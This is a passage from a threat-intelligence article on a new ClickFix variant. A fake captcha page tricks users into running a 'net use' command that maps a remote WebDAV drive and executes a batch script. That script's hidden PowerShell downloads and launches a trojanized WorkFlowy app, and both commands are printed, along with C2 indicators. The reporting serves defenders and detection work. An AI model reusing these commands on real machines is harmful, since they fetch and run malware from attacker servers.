---
title: Investigating a New Click-Fix Variant
url: https://thehackernews.com/2026/03/investigating-new-click-fix-variant.html
source: The Hacker News
date: 2026-03-13
fetch_date: 2026-03-14T04:14:27.297456
---

# Investigating a New Click-Fix Variant

#1 Trusted Cybersecurity News Platform

Followed by 5.20+ million[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.facebook.com/thehackernews)

[![The Hacker News Logo](data:image/png;base64...)](/)

**

**

[** Subscribe – Get Latest News](#email-outer)

* [** Home](/)
* [** Newsletter](#email-outer)
* [** Webinars](/p/upcoming-hacker-news-webinars.html)

* [Home](/)
* [Threat Intelligence](/search/label/Threat%20Intelligence)
* [Vulnerabilities](/search/label/Vulnerability)
* [Cyber Attacks](/search/label/Cyber%20Attack)
* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Expert Insights](https://thehackernews.com/expert-insights/)
* [Awards](https://awards.thehackernews.com/)

**

**

**

Resources

* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Awards](https://awards.thehackernews.com/)
* [Free eBooks](https://thehackernews.tradepub.com)

About Site

* [About THN](/p/about-us.html)
* [Jobs](/p/careers-technical-writer-designer-and.html)
* [Advertise with us](/p/advertising-with-hacker-news.html)

Contact/Tip Us

[**

Reach out to get featured—contact us to send your exclusive story idea, research, hacks, or ask us a question or leave a comment/feedback!](/p/submit-news.html)

Follow Us On Social Media

[**](https://www.facebook.com/thehackernews)
[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.youtube.com/c/thehackernews?sub_confirmation=1)
[**](https://www.instagram.com/thehackernews/)

[** RSS Feeds](https://feeds.feedburner.com/TheHackersNews)
[** Email Alerts](#email-outer)

[![Security Service Edge](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguiZ85S7494GyqhFt9uP48C8ggEnb3bp9Qmsdv4LOYjNWfa98MKx17Dk7o1nJrEV3ai3edIGIgwt6oO5iJMmYLcyu6PojcvJnO4IfLhVK2dzGKFyEroFjKQhnp2hd5Cc6G4CynJRfb55aclnGwj7rse9jMncn_vu_tFqQZtHZH3Sb5dMXwRKN-kSVYUMzD/s1700-e365/ai-d.png)](https://thehackernews.uk/wiz-ai-security-d)

# [Investigating a New Click-Fix Variant](https://thehackernews.com/2026/03/investigating-new-click-fix-variant.html)

**The Hacker News**Mar 13, 2026Malware / Threat Hunting

[![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAy3Jm9mBV4SvNdfv5AJ_ZIKoJSwtUVeXkiFUNwKFUN3F5j3kYJTpD1a65PEcgqX2cMT0DmtJJ7YCrYuhElQ9nhYtQkXRtQxnkpOqTgSUOCAJgO8Lv8HDWZxVuy74vgjErtUYrHPH-UrWLfLoL18i__L9a-6T1xdgMPjsTamIOab3KGcJE3kzxz5aR8tm8/s1700-e365/eviden.jpg)

***Disclaimer****: This report has been prepared by the Threat Research Center to enhance cybersecurity awareness and support the strengthening of defense capabilities. It is based on independent research and observations of the current threat landscape available at the time of publication. The content is intended for informational and preparedness purposes only.*

Read more blogs around threat intelligence and adversary research: <https://atos.net/en/lp/cybershield>

#### **Summary**

Atos Researchers identified a new variant of the popular ClickFix technique, where attackers convince the user to execute a malicious command on their own device through the Win + R shortcut. In this variation, a “net use” command is used to map a network drive from an external server, after which a “.cmd” batch file hosted on that drive is executed. Script downloads a ZIP archive, unpacks it, and executes the legitimate WorkFlowy application with modified, malicious logic hidden inside “.asar” archive. This acts as a C2 beacon and a dropper for the final malware payload.

|  |
| --- |
| [![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3trtAac3m4CbyOoWlIcWGgQJbB2hIcdMKsrtWT9acSAAUs3llaXtiuIbYzhI4HGptQBTHZnlKN9nfuQ22yM8mszDKFZzuMHd0TqbcOngBgYC6Lr21yD6O8bXQwO-6e8TI6hq_ip3wpUkEkWWz4JdsmgcgC0s7jDisLY2RZ1marb9m2DEIHvHNpH-oxzV/s1700-e365/1.png) |
| Figure 1: High-level overview of attack flow. |

## Attack overview

In this version, the initial vector of attack is the same as in all the other ones, a web page posing as a captcha mechanism – “happyglamper[.]ro”. It prompts the user to open the Run application via “Win+R”, followed by “Ctrl+V” and “Enter”

|  |
| --- |
| [![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVCV5rgx3oWMp5a4WXJ3NP57gv655-dINgkx4LRLg8lwamGFhO1hFqFun_3KGsnLpGe5lI637hSaEb7GoR1odH6M2HRFTKEVOl33_PEVYhKvKM9J-4BdBGys59SX-X38WWHQH9i81cK_P8rnjm6QDfUZfe8vtLlciT8rrlga1l0f2VBEXyI6OJeQzYNjof/s1700-e365/2.png) |
| Figure 2: Phishing website 1 |

|  |
| --- |
| [![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7sCd3P7-nA23PlNtVj_aKDRcMNCRC5BGg6HbuBawoSAQsOUXlQswhyKvafeNK457Gn6EFnXxD-nJgW-DQDg97bfYivG_ymb2KKHR8EL9K_AYtPb5k_2P7sClDst1ujYhM_ZBs3kIhKmlQvBpGGoth6w5oyi8GrDsGrSVW_uDcV25Sgn7gCxMYTc7aQyjt/s1700-e365/3.png) |
| Figure 3: Phishing website 2 |

This executes the following command:

```
“cmd.exe” /c net use Z: https://94.156.170[.]255/webdav /persistent:no && “Z:\update.cmd” & net use Z: /delete
```

Typically, at this stage, attackers have used PowerShell or mshta to download and execute the next stage of the malware. Here, instead, we can see that “net use” is being used to map and connect to a network drive of an external server from which a Batch script is executed. While not novel, these TTPs were never seen in ClickFix attacks before. Combined with the next uncommon stages of infection patterns, this campaign gives Adversaries high chances to evade defensive controls and stay under the radar of defenders.

In this case, the observed ClickFix variant of execution flow successfully bypassed the detection of Microsoft Defender for Endpoint. Atos security teams were able to detect it only thanks to the internal Threat Hunting service focusing on the main behavioral aspect of the ClickFix technique – initial execution through the RunMRU registry key ([hunting query available in the Appendix section](https://docs.google.com/document/d/1r34Rnlsdw-ISnATBS-SfmYNTu1Ln07IY/edit#heading=h.65tqoanctmva)).

The initial execution script “update.cmd” is loaded from the mapped drive and executed; after that, the mapped drive is removed. Content of “update.cmd”:

```
start "" /min powershell -WindowStyle Hidden -Command "Invoke-WebRequest 'https://94.156.170[.]255/flowy.zip' -OutFile \"$env:TEMP\dl.zip\";
Expand-Archive \"$env:TEMP\dl.zip\" -DestinationPath \"$env:LOCALAPPDATA\MyApp\" -Force;
Start-Process \"$env:LOCALAPPDATA\MyApp\WorkFlowy.exe\""
```

This spawns a PowerShell instance which downloads a zip archive and extracts it into “%LOCALAPPDATA%\MyApp\” directory. Then it executes “WorkFlowy.exe” binary.

|  |
| --- |
| [![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYswLn0RePHmWBtzdP1dCrwiIIc82DXP4R3W4Y3PLHKryzn3NeKYVnDfUXW4UEfkKPauBR3q5pq7-aua4PWT7lwQvvFz1QeljX9o-b6tZGXWK0CPnLliahPjFOk_BILSK9nHI4FJMF1-qzhbzIxaNYQ0GvqxShpYF_miFZYTMuNzERAprfA4OKO1p2Qnn1/s1700-e365/4.png) |
| Figure 4: Content of flowy.zip archive |

## WorkFlowy analysis

The archive contains a WorkFlowy desktop application (version 1.4.1050), signed by the developer “FunRoutine Inc.”, distributed as an Electron application bundle. Electron applications are written using popular web technologies – HTML, CSS, and JavaScript – and use “.asar” archives to pack source code during application packing. It is done for various reasons, like mitigating issues around long path names on Windows. The malicious code was injected into main.js, the Node.js entry point of the app, hidden inside the app.asar archive.

**Technical Profile**

|  |  |
| --- | --- |
| Property | Value |
| Target application | WorkFlowy Desktop (Electron) |
| Malicious version | 1.4.1050 |
| Malicious file | resources/app.asar → /main.js |
| C2 domain | cloudflare.report/forever/e/ |
| C2 origin IP | 144[.]31[.]165[.]173 (Frankfurt, AS215439 play2go.cloud) |
| Domain registered | January 2026, HK registrant, OnlineNIC regi...